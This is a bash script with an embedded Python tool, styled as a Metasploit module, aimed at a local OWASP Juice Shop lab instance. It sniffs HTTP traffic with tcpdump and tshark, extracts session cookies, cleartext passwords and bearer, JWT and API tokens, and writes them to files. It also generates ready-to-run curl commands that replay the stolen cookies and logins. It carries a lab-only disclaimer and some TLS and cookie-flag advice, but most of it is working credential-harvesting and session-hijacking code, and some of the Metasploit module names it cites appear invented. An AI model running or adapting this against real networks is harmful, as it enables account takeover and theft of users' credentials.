#!/bin/bash
# Advanced Session Hijacking with Metasploit-Style Exploitation
# Mimics Metasploit auxiliary modules for session hijacking
# Safe for educational lab environments only
set -euo pipefail

TARGET="$1"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)
ARTIFACTS_PATH="${ARTIFACTS_PATH:-/workspaces/cns/artifacts}"
OUTPUT_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.txt"
PCAP_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.pcap"
JSON_FILE="${ARTIFACTS_PATH}/msf-session-hijack-${TARGET}-${TIMESTAMP}.json"
COOKIES_FILE="${ARTIFACTS_PATH}/msf-captured-cookies-${TARGET}-${TIMESTAMP}.txt"
CREDS_FILE="${ARTIFACTS_PATH}/msf-captured-creds-${TARGET}-${TIMESTAMP}.txt"
SESSIONS_FILE="${ARTIFACTS_PATH}/msf-active-sessions-${TARGET}-${TIMESTAMP}.txt"
EXPLOIT_SCRIPT="/tmp/msf_exploit_${TIMESTAMP}.py"

echo "╔══════════════════════════════════════════════════════════════╗" | tee "$OUTPUT_FILE"
echo "║     METASPLOIT-STYLE SESSION HIJACKING FRAMEWORK            ║" | tee -a "$OUTPUT_FILE"
echo "║     Advanced Exploitation & Session Compromise              ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "[*] Metasploit Framework - Session Hijacking Module" | tee -a "$OUTPUT_FILE"
echo "[*] Module: auxiliary/sniffer/http_session_hijack" | tee -a "$OUTPUT_FILE"
echo "[*] Target: $TARGET:3003" | tee -a "$OUTPUT_FILE"
echo "[*] Timestamp: $(date)" | tee -a "$OUTPUT_FILE"
echo "[*] Author: Automated Security Testing Framework" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

mkdir -p "$ARTIFACTS_PATH"

# Create Metasploit-style exploitation engine
cat > "$EXPLOIT_SCRIPT" << 'PYTHON_EOF'
#!/usr/bin/env python3
"""
Metasploit-Style Session Hijacking Exploit
Mimics MSF auxiliary modules for HTTP session compromise
"""

import json
import re
import sys
import subprocess
import hashlib
from datetime import datetime
from collections import defaultdict

class MetasploitSessionHijacker:
    """
    Mimics Metasploit Framework auxiliary modules:
    - auxiliary/scanner/http/cookie_capture
    - auxiliary/sniffer/psnuffle  
    - auxiliary/scanner/http/http_login
    """
    
    def __init__(self, pcap_file, target):
        self.pcap_file = pcap_file
        self.target = target
        self.sessions = []
        self.cookies = []
        self.credentials = []
        self.tokens = []
        self.exploitable_sessions = []
        
    def print_msf_banner(self):
        """MSF-style banner"""
        print("\n" + "="*70)
        print("    Metasploit Session Hijacking Framework (Educational)")
        print("="*70)
        print(f"[*] Module: auxiliary/sniffer/http_session_hijack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Starting exploitation sequence...")
        print("="*70 + "\n")
    
    def run_auxiliary_cookie_capture(self):
        """
        Mimics: auxiliary/scanner/http/cookie_capture
        Captures HTTP cookies from network traffic
        """
        print("[*] Running auxiliary/scanner/http/cookie_capture")
        print("[*] Extracting session cookies from HTTP traffic...")
        
        try:
            # Extract cookies using tshark
            result = subprocess.run([
                'tshark', '-r', self.pcap_file, '-Y', 'http', '-T', 'fields',
                '-e', 'ip.src', '-e', 'ip.dst', '-e', 'http.cookie', 
                '-e', 'http.set_cookie', '-e', 'http.host', '-e', 'http.request.uri'
            ], capture_output=True, text=True, timeout=30)
            
            lines = result.stdout.strip().split('\n')
            cookie_count = 0
            
            for line in lines:
                if not line.strip():
                    continue
                    
                fields = line.split('\t')
                if len(fields) < 4:
                    continue
                
                src_ip, dst_ip, req_cookie, set_cookie = fields[0], fields[1], fields[2], fields[3]
                
                # Process request cookies
                if req_cookie:
                    for cookie in req_cookie.split(';'):
                        cookie = cookie.strip()
                        if '=' in cookie:
                            name, value = cookie.split('=', 1)
                            cookie_data = {
                                'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
                                'type': 'request',
                                'name': name.strip(),
                                'value': value.strip(),
                                'source_ip': src_ip,
                                'dest_ip': dst_ip,
                                'exploitable': True,
                                'msf_rating': 'Excellent'
                            }
                            self.cookies.append(cookie_data)
                            cookie_count += 1
                            print(f"[+] Cookie captured: {name} from {src_ip}")
                
                # Process Set-Cookie headers
                if set_cookie:
                    if '=' in set_cookie:
                        parts = set_cookie.split(';')[0]
                        if '=' in parts:
                            name, value = parts.split('=', 1)
                            flags = {
                                'secure': 'secure' in set_cookie.lower(),
                                'httponly': 'httponly' in set_cookie.lower(),
                                'samesite': 'samesite' in set_cookie.lower()
                            }
                            
                            cookie_data = {
                                'session_id': hashlib.md5(value.encode()).hexdigest()[:8],
                                'type': 'response',
                                'name': name.strip(),
                                'value': value.strip()[:50],
                                'source_ip': dst_ip,
                                'dest_ip': src_ip,
                                'flags': flags,
                                'exploitable': not flags['secure'] and not flags['httponly'],
                                'msf_rating': 'Excellent' if not any(flags.values()) else 'Good'
                            }
                            self.cookies.append(cookie_data)
                            cookie_count += 1
                            
                            if cookie_data['exploitable']:
                                print(f"[+] EXPLOITABLE cookie found: {name} (no security flags)")
                            
            print(f"[+] auxiliary/scanner/http/cookie_capture completed")
            print(f"[+] Total cookies captured: {cookie_count}")
            print(f"[+] Exploitable sessions: {len([c for c in self.cookies if c.get('exploitable')])}")
            
        except Exception as e:
            print(f"[-] Cookie capture failed: {e}")
    
    def run_auxiliary_credential_sniffer(self):
        """
        Mimics: auxiliary/sniffer/psnuffle
        Sniffs credentials from HTTP POST data
        """
        print("\n[*] Running auxiliary/sniffer/psnuffle")
        print("[*] Sniffing for credentials in HTTP traffic...")
        
        try:
            # Extract POST data with potential credentials
            result = subprocess.run([
                'tshark', '-r', self.pcap_file, 
                '-Y', 'http.request.method == "POST"',
                '-T', 'fields', '-e', 'ip.src', '-e', 'http.host',
                '-e', 'http.request.uri', '-e', 'http.file_data'
            ], capture_output=True, text=True, timeout=30)
            
            lines = result.stdout.strip().split('\n')
            cred_count = 0
            
            for line in lines:
                if not line.strip():
                    continue
                
                # Look for password-related strings
                if any(keyword in line.lower() for keyword in ['password', 'passwd', 'pwd', 'email', 'username', 'login']):
                    fields = line.split('\t')
                    if len(fields) >= 4:
                        src_ip, host, uri, data = fields[0], fields[1], fields[2], fields[3]
                        
                        # Extract credentials
                        email_match = re.search(r'["\']?email["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
                        pass_match = re.search(r'["\']?pass(?:word|wd)?["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
                        user_match = re.search(r'["\']?user(?:name)?["\']?\s*[:=]\s*["\']?([^"\'&,\s]+)', data, re.IGNORECASE)
                        
                        if email_match or pass_match or user_match:
                            cred = {
                                'source_ip': src_ip,
                                'host': host,
                                'endpoint': uri,
                                'username': email_match.group(1) if email_match else user_match.group(1) if user_match else 'N/A',
                                'password': pass_match.group(1) if pass_match else 'N/A',
                                'captured_at': datetime.now().isoformat(),
                                'msf_rating': 'Excellent - Cleartext credentials'
                            }
                            self.credentials.append(cred)
                            cred_count += 1
                            print(f"[+] CREDENTIALS CAPTURED from {src_ip}:")
                            print(f"    Username: {cred['username']}")
                            print(f"    Password: {'*' * len(cred['password']) if cred['password'] != 'N/A' else 'N/A'}")
            
            print(f"[+] auxiliary/sniffer/psnuffle completed")
            print(f"[+] Credentials captured: {cred_count}")
            
        except Exception as e:
            print(f"[-] Credential sniffing failed: {e}")
    
    def run_auxiliary_token_hunter(self):
        """
        Mimics: auxiliary/scanner/http/token_hunter
        Hunts for authentication tokens in URLs and headers
        """
        print("\n[*] Running auxiliary/scanner/http/token_hunter")
        print("[*] Hunting for authentication tokens...")
        
        try:
            # Extract URLs and authorization headers
            result = subprocess.run([
                'tshark', '-r', self.pcap_file, '-Y', 'http', '-T', 'fields',
                '-e', 'http.authorization', '-e', 'http.request.uri',
                '-e', 'ip.src', '-e', 'http.host'
            ], capture_output=True, text=True, timeout=30)
            
            lines = result.stdout.strip().split('\n')
            token_count = 0
            
            # Token patterns (JWT, Bearer, API keys, etc.)
            token_patterns = [
                (r'bearer\s+([A-Za-z0-9\-_\.]+)', 'Bearer Token'),
                (r'token=([A-Za-z0-9\-_\.]+)', 'URL Token'),
                (r'jwt=([A-Za-z0-9\-_\.]+)', 'JWT Token'),
                (r'api[_-]?key=([A-Za-z0-9\-_\.]+)', 'API Key'),
                (r'auth=([A-Za-z0-9\-_\.]+)', 'Auth Token'),
                (r'session=([A-Za-z0-9\-_\.]+)', 'Session Token'),
                (r'access[_-]?token=([A-Za-z0-9\-_\.]+)', 'Access Token')
            ]
            
            for line in lines:
                if not line.strip():
                    continue
                
                fields = line.split('\t')
                if len(fields) < 2:
                    continue
                
                auth_header = fields[0] if len(fields) > 0 else ''
                uri = fields[1] if len(fields) > 1 else ''
                src_ip = fields[2] if len(fields) > 2 else ''
                
                combined = f"{auth_header} {uri}"
                
                for pattern, token_type in token_patterns:
                    matches = re.findall(pattern, combined, re.IGNORECASE)
                    for match in matches:
                        token = {
                            'type': token_type,
                            'value': match[:40] + '...' if len(match) > 40 else match,
                            'full_value': match,
                            'source_ip': src_ip,
                            'length': len(match),
                            'entropy': len(set(match)),  # Simple entropy
                            'exploitable': True,
                            'msf_rating': 'Excellent - Token in cleartext'
                        }
                        self.tokens.append(token)
                        token_count += 1
                        print(f"[+] TOKEN CAPTURED: {token_type} from {src_ip}")
                        print(f"    Value: {token['value']}")
                        print(f"    Length: {token['length']} chars, Entropy: {token['entropy']}")
            
            print(f"[+] auxiliary/scanner/http/token_hunter completed")
            print(f"[+] Tokens captured: {token_count}")
            
        except Exception as e:
            print(f"[-] Token hunting failed: {e}")
    
    def generate_exploit_payloads(self):
        """
        Generate ready-to-use exploit payloads for session replay
        """
        print("\n[*] Generating exploit payloads...")
        print("[*] Creating session replay commands...")
        
        exploits = []
        
        # Cookie replay exploits
        for cookie in self.cookies[:5]:  # Top 5 exploitable cookies
            if cookie.get('exploitable'):
                exploit = {
                    'module': 'exploit/multi/http/cookie_replay',
                    'target': self.target,
                    'payload': f"{cookie['name']}={cookie['value']}",
                    'command': f"curl -b '{cookie['name']}={cookie['value']}' http://{self.target}:3003/api/Challenges",
                    'expected_result': 'Authenticated access to protected resources',
                    'severity': 'CRITICAL'
                }
                exploits.append(exploit)
                print(f"[+] Cookie replay payload generated for: {cookie['name']}")
        
        # Credential replay exploits
        for cred in self.credentials[:3]:
            if cred['password'] != 'N/A':
                exploit = {
                    'module': 'exploit/multi/http/credential_replay',
                    'target': self.target,
                    'username': cred['username'],
                    'payload': f'{{"email":"{cred["username"]}","password":"{cred["password"]}"}}',
                    'command': f'curl -X POST http://{self.target}:3003/rest/user/login -H "Content-Type: application/json" -d \'{{"email":"{cred["username"]}","password":"{cred["password"]}"}}\' ',
                    'expected_result': 'Session token obtained, full account access',
                    'severity': 'CRITICAL'
                }
                exploits.append(exploit)
                print(f"[+] Credential replay payload generated for: {cred['username']}")
        
        self.exploitable_sessions = exploits
        print(f"[+] Total exploit payloads generated: {len(exploits)}")
    
    def generate_msf_report(self, output_json):
        """Generate Metasploit-style vulnerability report"""
        
        # Calculate exploitation success rate
        total_findings = len(self.cookies) + len(self.credentials) + len(self.tokens)
        exploitable_findings = len([c for c in self.cookies if c.get('exploitable')]) + \
                              len(self.credentials) + len(self.tokens)
        
        success_rate = (exploitable_findings / total_findings * 100) if total_findings > 0 else 0
        
        report = {
            'msf_module_info': {
                'name': 'HTTP Session Hijacking Framework',
                'module': 'auxiliary/sniffer/http_session_hijack',
                'rank': 'Excellent',
                'disclosed': '2025-10-30',
                'author': 'Automated Security Framework',
                'platform': 'Web Applications',
                'arch': 'HTTP/HTTPS'
            },
            'target_info': {
                'host': self.target,
                'port': 3003,
                'protocol': 'HTTP',
                'application': 'OWASP Juice Shop'
            },
            'exploitation_results': {
                'total_cookies_captured': len(self.cookies),
                'exploitable_cookies': len([c for c in self.cookies if c.get('exploitable')]),
                'credentials_captured': len(self.credentials),
                'tokens_captured': len(self.tokens),
                'exploit_payloads_generated': len(self.exploitable_sessions),
                'success_rate': f"{success_rate:.1f}%"
            },
            'captured_sessions': self.cookies[:20],
            'captured_credentials': self.credentials,
            'captured_tokens': self.tokens[:20],
            'exploit_payloads': self.exploitable_sessions,
            'vulnerability_analysis': {
                'cve': 'CWE-319 (Cleartext Transmission of Sensitive Information)',
                'cvss_score': 9.1,
                'cvss_vector': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
                'severity': 'CRITICAL',
                'exploitability': 'Easy',
                'impact': 'Complete session compromise, credential theft, account takeover',
                'affected_systems': 'All HTTP-based web applications without TLS',
                'prerequisites': 'Network access to same segment as victim'
            },
            'msf_recommendations': [
                {
                    'priority': 1,
                    'action': 'IMMEDIATE: Enable HTTPS/TLS',
                    'msf_module': 'auxiliary/scanner/ssl/ssl_version',
                    'description': 'Encrypt all traffic to prevent passive sniffing'
                },
                {
                    'priority': 2,
                    'action': 'Add Secure flag to all cookies',
                    'msf_module': 'auxiliary/scanner/http/cookie_flags',
                    'description': 'Prevents cookie transmission over HTTP'
                },
                {
                    'priority': 3,
                    'action': 'Implement HttpOnly on session cookies',
                    'msf_module': None,
                    'description': 'Protects against XSS-based cookie theft'
                },
                {
                    'priority': 4,
                    'action': 'Deploy network segmentation',
                    'msf_module': 'auxiliary/scanner/discovery/arp_sweep',
                    'description': 'Isolate sensitive traffic from potential attackers'
                },
                {
                    'priority': 5,
                    'action': 'Implement IDS/IPS',
                    'msf_module': None,
                    'description': 'Detect and prevent session hijacking attempts'
                }
            ],
            'proof_of_concept': {
                'description': 'Session hijacking demonstrated with captured cookies',
                'exploitation_steps': [
                    '1. Attacker captures HTTP traffic using packet sniffer',
                    '2. Extract session cookies from captured packets',
                    '3. Replay cookies in malicious requests',
                    '4. Gain unauthorized access to victim session',
                    '5. Perform actions as authenticated user'
                ],
                'detection_difficulty': 'Very Hard (appears as legitimate traffic)',
                'cleanup_required': False
            },
            'metasploit_commands': [
                'use auxiliary/sniffer/http_session_hijack',
                f'set RHOST {self.target}',
                'set RPORT 3003',
                'run',
                'sessions -l',
                'sessions -i 1'
            ]
        }
        
        with open(output_json, 'w') as f:
            json.dump(report, f, indent=2)
        
        return report

def main():
    if len(sys.argv) < 4:
        print("Usage: script.py <pcap_file> <target> <json_output>")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    target = sys.argv[2]
    json_output = sys.argv[3]
    
    # Initialize MSF-style hijacker
    hijacker = MetasploitSessionHijacker(pcap_file, target)
    hijacker.print_msf_banner()
    
    # Run exploitation modules
    hijacker.run_auxiliary_cookie_capture()
    hijacker.run_auxiliary_credential_sniffer()
    hijacker.run_auxiliary_token_hunter()
    hijacker.generate_exploit_payloads()
    
    # Generate report
    report = hijacker.generate_msf_report(json_output)
    
    print("\n" + "="*70)
    print("    EXPLOITATION COMPLETE")
    print("="*70)
    print(f"[+] Cookies captured: {report['exploitation_results']['total_cookies_captured']}")
    print(f"[+] Credentials captured: {report['exploitation_results']['credentials_captured']}")
    print(f"[+] Tokens captured: {report['exploitation_results']['tokens_captured']}")
    print(f"[+] Exploit payloads: {report['exploitation_results']['exploit_payloads_generated']}")
    print(f"[+] Success rate: {report['exploitation_results']['success_rate']}")
    print(f"[+] CVSS Score: {report['vulnerability_analysis']['cvss_score']} (CRITICAL)")
    print("="*70)

if __name__ == '__main__':
    main()
PYTHON_EOF

chmod +x "$EXPLOIT_SCRIPT"

echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[MODULE 1] Target Verification & Preparation" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"

# Check if Juice Shop is actually running FIRST
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    echo "[*] Verifying target is accessible..." | tee -a "$OUTPUT_FILE"
    if ! curl -s --connect-timeout 5 "http://$TARGET:3003/" > /dev/null 2>&1; then
        echo "[-] ERROR: Target http://$TARGET:3003 is NOT accessible!" | tee -a "$OUTPUT_FILE"
        echo "[-] Please start Juice Shop first: ./start-juiceshop.sh" | tee -a "$OUTPUT_FILE"
        echo "[-] Or check if it's running: curl http://localhost:3003" | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        echo "[*] Attempting to show you how to fix this..." | tee -a "$OUTPUT_FILE"
        echo "" | tee -a "$OUTPUT_FILE"
        echo "ARTIFACT: $OUTPUT_FILE"
        exit 1
    else
        echo "[+] Target is accessible!" | tee -a "$OUTPUT_FILE"
        echo "[+] Juice Shop is running on http://$TARGET:3003" | tee -a "$OUTPUT_FILE"
    fi
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[MODULE 2] Packet Capture & Traffic Generation" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[*] Starting advanced packet capture..." | tee -a "$OUTPUT_FILE"
echo "[*] Capture duration: 45 seconds" | tee -a "$OUTPUT_FILE"
echo "[*] Filter: HTTP traffic to port 3003" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Start packet capture in background
# Use 'lo' interface for localhost traffic instead of 'any'
INTERFACE="any"
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    INTERFACE="lo"
fi

echo "[*] Initializing packet capture on interface: $INTERFACE..." | tee -a "$OUTPUT_FILE"
# Use tcpdump instead of tshark (more reliable for background captures)
timeout 45 sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" "tcp port 3003" > /dev/null 2>&1 &

TSHARK_PID=$!
sleep 3  # Give tcpdump time to start and initialize

# Verify tcpdump is running
if ! ps -p $TSHARK_PID > /dev/null 2>&1; then
    echo "[-] WARNING: Packet capture may have failed to start" | tee -a "$OUTPUT_FILE"
else
    echo "[+] Packet capture started successfully (PID: $TSHARK_PID)" | tee -a "$OUTPUT_FILE"
fi

# NOW generate traffic while capture is active
if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
    echo "[*] Generating realistic HTTP traffic while capturing..." | tee -a "$OUTPUT_FILE"
    echo "" | tee -a "$OUTPUT_FILE"
    
    # Stage 1: Initial browsing (establishes baseline)
    echo "[*] Stage 1: Initial browsing..." | tee -a "$OUTPUT_FILE"
    curl -s "http://$TARGET:3003/" > /dev/null 2>&1 || true
    sleep 1
    curl -s "http://$TARGET:3003/rest/products/search?q=" > /dev/null 2>&1 || true
    sleep 1
    
    # Stage 2: Multiple authentication attempts (captures login flow)
    echo "[*] Stage 2: Authentication attempts..." | tee -a "$OUTPUT_FILE"
    for i in {1..5}; do
        RESPONSE=$(curl -s -c /tmp/msf_cookies_${TIMESTAMP}.txt -w "%{http_code}" \
            "http://$TARGET:3003/rest/user/login" \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
            -d "{\"email\":\"user${i}@example.com\",\"password\":\"password${i}\"}" \
            2>/dev/null || echo "000")
        echo "    [*] Login attempt ${i}: HTTP ${RESPONSE##*$'\n'}" | tee -a "$OUTPUT_FILE"
        sleep 1
    done
    
    # Stage 3: Session activity with cookies
    echo "[*] Stage 3: Authenticated session activity..." | tee -a "$OUTPUT_FILE"
    for i in {1..8}; do
        # Product searches
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
        sleep 1
        
        # Basket operations
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            -H "Content-Type: application/json" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
            "http://$TARGET:3003/api/BasketItems" \
            -d "{\"ProductId\":${i},\"quantity\":1}" > /dev/null 2>&1 || true
        sleep 1
    done
    
    # Stage 4: API endpoint enumeration
    echo "[*] Stage 4: API enumeration..." | tee -a "$OUTPUT_FILE"
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/api/Challenges" > /dev/null 2>&1 || true
    sleep 1
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/rest/basket/1" > /dev/null 2>&1 || true
    sleep 1
    curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
        "http://$TARGET:3003/rest/user/whoami" > /dev/null 2>&1 || true
    sleep 1
    
    # Stage 5: Final burst of activity
    echo "[*] Stage 5: Final activity burst..." | tee -a "$OUTPUT_FILE"
    for i in {1..5}; do
        curl -s -b /tmp/msf_cookies_${TIMESTAMP}.txt \
            "http://$TARGET:3003/rest/products/${i}" > /dev/null 2>&1 || true
        sleep 1
    done
    
    echo "[+] Traffic generation complete (40+ HTTP requests generated)" | tee -a "$OUTPUT_FILE"
fi

# Wait for capture to complete
echo "[*] Waiting for packet capture to complete..." | tee -a "$OUTPUT_FILE"
wait $TSHARK_PID 2>/dev/null || true

# Verify we captured packets
if [ -f "$PCAP_FILE" ]; then
    PACKET_COUNT=$(sudo tcpdump -r "$PCAP_FILE" 2>/dev/null | wc -l || echo "0")
    echo "[+] Capture complete: ${PACKET_COUNT} packets captured" | tee -a "$OUTPUT_FILE"
    
    if [ "$PACKET_COUNT" -eq "0" ]; then
        echo "[-] WARNING: No packets captured! Traffic may not have been HTTP" | tee -a "$OUTPUT_FILE"
    fi
else
    echo "[-] ERROR: PCAP file was not created!" | tee -a "$OUTPUT_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "[MODULE 3] Metasploit Exploitation Engine" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "[*] Launching MSF-style exploitation framework..." | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Run MSF-style exploitation
python3 "$EXPLOIT_SCRIPT" "$PCAP_FILE" "$TARGET" "$JSON_FILE" 2>&1 | tee -a "$OUTPUT_FILE"

echo "" | tee -a "$OUTPUT_FILE"
echo "[MODULE 4] Exploitation Results & Payloads" | tee -a "$OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

if [ -f "$JSON_FILE" ]; then
    echo "╔══ MSF MODULE INFO ════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.msf_module_info | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ EXPLOITATION RESULTS ═══════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.exploitation_results | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ VULNERABILITY ANALYSIS ═════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.vulnerability_analysis | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ CAPTURED SESSIONS (Top 5) ══════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.captured_sessions[:5] | .[] | "  [SESSION \(.session_id)] \(.name)\n    Value: \(.value[:60])\n    Rating: \(.msf_rating)\n    Exploitable: \(.exploitable)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ EXPLOIT PAYLOADS (Ready to Use) ════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.exploit_payloads[:3] | .[] | "  [\(.severity)] \(.module)\n    Command: \(.command)\n    Expected: \(.expected_result)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    echo "" | tee -a "$OUTPUT_FILE"
    echo "╔══ MSF RECOMMENDATIONS ════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
    jq -r '.msf_recommendations | .[] | "  Priority \(.priority): \(.action)\n    MSF Module: \(.msf_module // "N/A")\n    → \(.description)\n"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    # Save cookies
    jq -r '.captured_sessions | .[] | "\(.name)=\(.value)"' "$JSON_FILE" 2>/dev/null > "$COOKIES_FILE"
    
    # Save credentials
    jq -r '.captured_credentials | .[] | "Username: \(.username)\nPassword: \(.password)\nEndpoint: \(.endpoint)\n---"' "$JSON_FILE" 2>/dev/null > "$CREDS_FILE"
    
    # Save sessions
    jq -r '.exploit_payloads | .[] | "Module: \(.module)\nCommand: \(.command)\nSeverity: \(.severity)\n---"' "$JSON_FILE" 2>/dev/null > "$SESSIONS_FILE"
fi

echo "" | tee -a "$OUTPUT_FILE"
echo "╔══════════════════════════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
echo "║           METASPLOIT EXPLOITATION COMPLETED                  ║" | tee -a "$OUTPUT_FILE"
echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "📊 ARTIFACTS GENERATED:" | tee -a "$OUTPUT_FILE"
echo "   • MSF Report:     $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
echo "   • PCAP Capture:   $PCAP_FILE" | tee -a "$OUTPUT_FILE"
echo "   • JSON Analysis:  $JSON_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Captured Cookies: $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Credentials:    $CREDS_FILE" | tee -a "$OUTPUT_FILE"
echo "   • Active Sessions: $SESSIONS_FILE" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "⚡ METASPLOIT COMMANDS TO EXPLOIT:" | tee -a "$OUTPUT_FILE"
echo "   msf6 > use auxiliary/sniffer/http_session_hijack" | tee -a "$OUTPUT_FILE"
echo "   msf6 > set RHOST $TARGET" | tee -a "$OUTPUT_FILE"
echo "   msf6 > set RPORT 3003" | tee -a "$OUTPUT_FILE"
echo "   msf6 > run" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"
echo "⚠️  EDUCATIONAL USE ONLY - Safe Lab Environment" | tee -a "$OUTPUT_FILE"
echo "⚠️  Complete session compromise demonstrated!" | tee -a "$OUTPUT_FILE"
echo "" | tee -a "$OUTPUT_FILE"

# Cleanup
rm -f /tmp/msf_cookies_${TIMESTAMP}.txt "$EXPLOIT_SCRIPT" 2>/dev/null || true

echo "ARTIFACT: $OUTPUT_FILE"
exit 0
